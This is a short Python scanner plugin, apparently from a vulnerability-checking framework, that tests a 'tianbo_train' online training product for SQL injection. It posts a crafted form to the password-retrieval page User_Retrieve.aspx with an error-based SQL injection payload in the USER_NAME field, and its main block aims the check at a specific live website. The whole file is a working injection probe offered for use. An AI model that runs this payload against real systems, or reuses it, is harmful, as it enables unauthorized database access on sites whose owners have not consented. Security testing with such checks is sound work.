#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:小光
#refer:http://www.wooyun.org/bugs/wooyun-2010-059810



def assign(service, arg):
    if service == "tianbo_train":
        return True, arg
        
        
def audit(arg): 
    payload = 'Web_Org/User_Retrieve.aspx '
    postdata = '__VIEWSTATE=%2fwEPDwUKMTYwMzExOTg0MA9kFgJmD2QWAgIBD2QWBAIBDxYCHgRUZXh0BfkBPEEgaHJlZj0iU2VhcmNoX0xpc3QuYXNweD9TZWFyY2g95YWs5Yqh5ZGYIj7lhazliqHlkZg8L0E%2b4pSKPEEgaHJlZj0iU2VhcmNoX0xpc3QuYXNweD9TZWFyY2g95Y2r55Sf55uR552jIj7ljavnlJ%2fnm5HnnaM8L0E%2b4pSKPEEgaHJlZj0iU2VhcmNoX0xpc3QuYXNweD9TZWFyY2g96LSi57uP5rOV6KeEIj7otKLnu4%2fms5Xop4Q8L0E%2b4pSKPEEgaHJlZj0iU2VhcmNoX0xpc3QuYXNweD9TZWFyY2g95Lya6K6h6K%2bBIj7kvJrorqHor4E8L0E%2bZAIGDw8WAh8ABYcCQ29weXJpZ2h0IEAgMjAwNy0yMDEzIOS4iua1t%2bWcqOe6v%2bWfueiureezu%2be7n%2bWFrOWPuCBBbGwgUmlnaHRzIFJlc2VydmVkLjxBIGhyZWY9IiMiPuayqklDUOWkhzAwMDAwMDAw5Y%2b3PC9BPjxCUj7lnLDlnYDvvJrkuIrmtbfluILmtabkuJzmlrDljLrmtZnmoaXot68yODnlj7flu7rpk7blpKfljqZB5bqnMjEwN%2bWupCDpgq7nvJbvvJowMDAwMDA8QlI%2b6IGU57O755S16K%2bd77yaMDAwLTAwMDAwMDAwLDAwMDAwMDAwIOS8oOecn%2b%2b8mjAyMS0wMDAwMDAwMC0wMDBkZGQXvpnElTlOy1PBNmFuhovZO5Nyhg%3d%3d&ctl00$ContentPlaceHolder1$infoSave=%e6%89%be%e5%9b%9e%e5%af%86%e7%a0%81&ctl00$ContentPlaceHolder1$STU_CONTACT=3&ctl00$ContentPlaceHolder1$STU_EMAIL=netsparker%40example.com&ctl00$ContentPlaceHolder1$STU_MOBILE=3&ctl00$ContentPlaceHolder1$STU_PHONE=3&ctl00$ContentPlaceHolder1$USER_NAME=\'%20and%20db_name(1)>0--\''
    url = arg + payload
    code, head, res, errcode, _ = curl.curl2(url,postdata)
    if code == 200 and 'master' in res :
        security_hole(arg+payload+'   :found sql Injection')




if __name__ == '__main__':
    from dummy import *
    audit(assign('tianbo_train','http://www.fenghuaedu.net/')[1])